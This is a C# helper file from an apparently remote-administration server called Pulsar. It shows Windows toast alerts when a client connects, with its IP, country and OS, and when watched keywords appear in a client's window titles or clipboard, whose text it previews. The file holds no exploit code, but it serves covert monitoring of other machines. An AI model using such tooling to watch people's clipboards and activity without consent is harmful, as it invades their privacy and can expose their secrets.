using Microsoft.Toolkit.Uwp.Notifications;
using System;
using System.Diagnostics;
using Windows.Data.Xml.Dom;
using Windows.UI.Notifications;

namespace Pulsar.Server.Helper
{
    /// <summary>
    /// Helper class for displaying Windows Toast notifications
    /// </summary>
    public static class ToastNotificationHelper
    {
        private const string APP_ID = "Pulsar.Server";

        /// <summary>
        /// Initializes the toast notification system
        /// </summary>
        public static void Initialize()
        {
            try
            {
                ToastNotificationManagerCompat.OnActivated += OnToastActivated;
            }
            catch (Exception ex)
            {
                Debug.WriteLine($"Failed to initialize toast notifications: {ex.Message}");
            }
        }

        /// <summary>
        /// Shows a client connection notification
        /// </summary>
        /// <param name="country">Country of the connecting client</param>
        /// <param name="ipAddress">IP address of the client</param>
        /// <param name="operatingSystem">Operating system of the client</param>
        public static void ShowClientConnectionNotification(string country, string ipAddress, string operatingSystem)
        {
            try
            {
                var builder = new ToastContentBuilder()
                    .AddText($"Client connected from {country}!")
                    .AddText($"IP Address: {ipAddress}")
                    .AddText($"OS: {operatingSystem}")
                    //.AddAppLogoOverride(GetAppIcon())
                    .SetToastScenario(ToastScenario.Default);

                Debug.WriteLine($"Showing client connection notification: {country}, {ipAddress}, {operatingSystem}");

                ShowToast(builder.GetToastContent());

                Debug.WriteLine(builder.GetToastContent().GetContent());
            }
            catch (Exception ex)
            {
                Debug.WriteLine($"Failed to show client connection notification: {ex.Message}");
                System.Windows.Forms.MessageBox.Show($"Client connected from {country}!\nIP: {ipAddress}\nOS: {operatingSystem}",
                    "Client Connected", System.Windows.Forms.MessageBoxButtons.OK, System.Windows.Forms.MessageBoxIcon.Information);
            }
        }

        /// <summary>
        /// Shows a keyword detection notification
        /// </summary>
        /// <param name="keyword">The detected keyword</param>
        /// <param name="clientName">Name of the client</param>
        /// <param name="windowText">Window title where keyword was found</param>
        public static void ShowKeywordNotification(string keyword, string clientName, string windowText)
        {
            try
            {
                var builder = new ToastContentBuilder()
                    .AddText($"Keyword Triggered: {keyword}")
                    .AddText($"Client: {clientName}")
                    .AddText($"Window: {TruncateText(windowText, 80)}")
                    //.AddAppLogoOverride(GetAppIcon())
                    .SetToastScenario(ToastScenario.Alarm);

                ShowToast(builder.GetToastContent());
            }
            catch (Exception ex)
            {
                Debug.WriteLine($"Failed to show keyword notification: {ex.Message}");
                System.Windows.Forms.MessageBox.Show($"Keyword Triggered: {keyword}\nClient: {clientName}\nWindow: {windowText}",
                    "Keyword Detected", System.Windows.Forms.MessageBoxButtons.OK, System.Windows.Forms.MessageBoxIcon.Warning);
            }
        }

        /// <summary>
        /// Shows a clipboard keyword detection notification
        /// </summary>
        /// <param name="keyword">The detected keyword</param>
        /// <param name="clientName">Name of the client</param>
        /// <param name="clipboardContent">Content from clipboard</param>
        public static void ShowClipboardKeywordNotification(string keyword, string clientName, string clipboardContent)
        {
            try
            {
                string clipboardPreview = TruncateText(clipboardContent, 60);

                var builder = new ToastContentBuilder()
                    .AddText($"Clipboard Keyword: {keyword}")
                    .AddText($"Client: {clientName}")
                    .AddText($"Clipboard: {clipboardPreview}")
                    //.AddAppLogoOverride(GetAppIcon(), ToastGenericAppLogo.Circle)
                    .SetToastScenario(ToastScenario.Alarm);

                ShowToast(builder.GetToastContent());
            }
            catch (Exception ex)
            {
                Debug.WriteLine($"Failed to show clipboard notification: {ex.Message}");
                System.Windows.Forms.MessageBox.Show($"Clipboard Keyword: {keyword}\nClient: {clientName}\nClipboard: {clipboardContent}",
                    "Clipboard Keyword Detected", System.Windows.Forms.MessageBoxButtons.OK, System.Windows.Forms.MessageBoxIcon.Warning);
            }
        }

        /// <summary>
        /// Shows a general notification
        /// </summary>
        /// <param name="title">Notification title</param>
        /// <param name="message">Notification message</param>
        /// <param name="clientName">Name of the client</param>
        /// <param name="clipboardContent">Optional clipboard content</param>
        public static void ShowGeneralNotification(string title, string message, string clientName, string clipboardContent = null)
        {
            try
            {
                var builder = new ToastContentBuilder()
                    .AddText(title);

                if (string.IsNullOrEmpty(clipboardContent))
                {
                    builder.AddText($"{clientName}: {message}");
                }
                else
                {
                    builder.AddText($"{clientName}: {message}")
                           .AddText($"Clipboard: {TruncateText(clipboardContent, 60)}");
                }

                builder.SetToastScenario(ToastScenario.Default);

                ShowToast(builder.GetToastContent());
            }
            catch (Exception ex)
            {
                Debug.WriteLine($"Failed to show general notification: {ex.Message}");
                string fallbackMessage = string.IsNullOrEmpty(clipboardContent) 
                    ? $"{clientName}: {message}"
                    : $"{clientName}: {message}\nClipboard: {clipboardContent}";
                System.Windows.Forms.MessageBox.Show(fallbackMessage, title, 
                    System.Windows.Forms.MessageBoxButtons.OK, System.Windows.Forms.MessageBoxIcon.Information);
            }
        }

        /// <summary>
        /// Displays the toast notification
        /// </summary>
        /// <param name="content">Toast content to display</param>
        private static void ShowToast(ToastContent content)
        {
            try
            {
                var doc = new XmlDocument();
                doc.LoadXml(content.GetContent());

                var toast = new ToastNotification(doc)
                {
                    ExpirationTime = DateTime.Now.AddMinutes(5)
                };

                ToastNotificationManagerCompat.CreateToastNotifier().Show(toast);

                Debug.WriteLine("Toast notification displayed successfully.");
            }
            catch (Exception ex)
            {
                Debug.WriteLine($"Failed to display toast: {ex.Message}");
                throw;
            }
        }

        /// <summary>
        /// Gets the application icon path for toast notifications
        /// </summary>
        /// <returns>Path to the application icon</returns>
        private static string GetAppIcon()
        {
            try
            {
                var appPath = System.Reflection.Assembly.GetExecutingAssembly().Location;
                var appDir = System.IO.Path.GetDirectoryName(appPath);
                var iconPath = System.IO.Path.Combine(appDir, "Images", "Icons", "Pulsar_Server.ico");
                
                if (System.IO.File.Exists(iconPath))
                {
                    return $"file:///{iconPath.Replace('\\', '/')}";
                }
            }
            catch (Exception ex)
            {
                Debug.WriteLine($"Failed to get app icon: {ex.Message}");
            }

            return null;
        }

        /// <summary>
        /// Truncates text to specified length with ellipsis
        /// </summary>
        /// <param name="text">Text to truncate</param>
        /// <param name="maxLength">Maximum length</param>
        /// <returns>Truncated text</returns>
        private static string TruncateText(string text, int maxLength)
        {
            if (string.IsNullOrEmpty(text) || text.Length <= maxLength)
                return text;

            return text.Substring(0, maxLength) + "...";
        }

        /// <summary>
        /// Handles toast notification activation (when user clicks on toast)
        /// </summary>
        /// <param name="e">Activation event arguments</param>
        private static void OnToastActivated(ToastNotificationActivatedEventArgsCompat e)
        {
            try
            {
                var mainForm = System.Windows.Forms.Application.OpenForms["FrmMain"];
                if (mainForm != null)
                {
                    mainForm.Invoke(new Action(() =>
                    {
                        mainForm.WindowState = System.Windows.Forms.FormWindowState.Normal;
                        mainForm.Activate();
                        mainForm.BringToFront();
                    }));
                }
            }
            catch (Exception ex)
            {
                Debug.WriteLine($"Failed to handle toast activation: {ex.Message}");
            }
        }
    }
}
